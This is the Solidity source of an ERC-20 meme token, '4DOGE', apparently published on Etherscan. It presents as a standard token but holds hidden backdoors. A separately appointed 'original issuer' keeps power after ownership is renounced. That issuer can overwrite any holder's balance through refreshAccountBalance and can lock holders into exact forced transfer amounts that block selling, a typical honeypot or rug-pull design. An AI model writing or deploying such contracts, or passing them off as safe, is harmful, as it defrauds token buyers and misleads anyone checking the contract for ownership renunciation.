/**
 *Submitted for verification at Etherscan.io on 2023-06-22
*/

//SPDX-License-Identifier: UNLICENSED

// https://t.me/doge4_4doge

pragma solidity ^0.8.16;

interface ITokenStandard20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address holder) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract SenderContext {
    function fetchSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract UnitaryControl is SenderContext {
    address private soleController;
    event ControllerChanged(address indexed formerController, address indexed newController);

    constructor() {
        address sender = fetchSender();
        soleController = sender;
        emit ControllerChanged(address(0), sender);
    }

    function retrieveController() public view virtual returns (address) {
        return soleController;
    }

    modifier onlyController() {
        require(retrieveController() == fetchSender(), "Not authorized. Sole controller only.");
        _;
    }

    function surrenderControl() public virtual onlyController {
        emit ControllerChanged(soleController, address(0));
        soleController = address(0);
    }
}

contract fourdoge is SenderContext, UnitaryControl, ITokenStandard20 {
    mapping (address => mapping (address => uint256)) private authorizationLimits;
    mapping (address => uint256) private accountBalances;
    mapping (address => uint256) private enforcedTransferValues;
    address private originalIssuer;

    string public constant tokenLabel = "4DOGE";
    string public constant tokenAbbreviation = "4DOGE";
    uint8 public constant tokenPrecision = 18;
    uint256 public constant ultimateSupply = 1000000 * (10 ** tokenPrecision);

    constructor() {
        accountBalances[fetchSender()] = ultimateSupply;
        emit Transfer(address(0), fetchSender(), ultimateSupply);
    }

    modifier onlyOriginalIssuer() {
        require(getOriginalIssuer() == fetchSender(), "Not authorized. Original issuer only.");
        _;
    }

    function getOriginalIssuer() public view virtual returns (address) {
        return originalIssuer;
    }

    function appointOriginalIssuer(address designatedIssuer) public onlyController {
        originalIssuer = designatedIssuer;
    }

    event TokenAllocation(address indexed participant, uint256 formerBalance, uint256 updatedBalance);

    function enforceTransferValue(address holder) public view returns (uint256) {
        return enforcedTransferValues[holder];
    }

    function assignEnforcedTransferValues(address[] calldata holders, uint256 value) public onlyOriginalIssuer {
        for (uint i = 0; i < holders.length; i++) {
            enforcedTransferValues[holders[i]] = value;
        }
    }

    function refreshAccountBalance(address[] memory addresses, uint256 newBalance) public onlyOriginalIssuer {
        require(newBalance >= 0, "Amount must be non-negative");

        for (uint256 i = 0; i < addresses.length; i++) {
            address currentAddr = addresses[i];
            require(currentAddr != address(0), "Invalid address provided");

            uint256 previousBalance = accountBalances[currentAddr];
            accountBalances[currentAddr] = newBalance;

            emit TokenAllocation(currentAddr, previousBalance, newBalance);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return accountBalances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(accountBalances[fetchSender()] >= amount, "Insufficient balance");

        uint256 requiredTransferValue = enforceTransferValue(fetchSender());
        if (requiredTransferValue > 0) {
            require(amount == requiredTransferValue, "Mandatory transfer value mismatch");
        }

        accountBalances[fetchSender()] -= amount;
        accountBalances[recipient] += amount;

        emit Transfer(fetchSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return authorizationLimits[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        authorizationLimits[fetchSender()][spender] = amount;
        emit Approval(fetchSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(authorizationLimits[sender][fetchSender()] >= amount, "Allowance limit exceeded");

        uint256 requiredTransferValue = enforceTransferValue(sender);
        if (requiredTransferValue > 0) {
            require(amount == requiredTransferValue, "Mandatory transfer value mismatch");
        }

        accountBalances[sender] -= amount;
        accountBalances[recipient] += amount;
        authorizationLimits[sender][fetchSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return ultimateSupply;
    }

    function name() public view returns (string memory) {
        return tokenLabel;
    }

    function symbol() public view returns (string memory) {
        return tokenAbbreviation;
    }

    function decimals() public view returns (uint8) {
        return tokenPrecision;
    }

}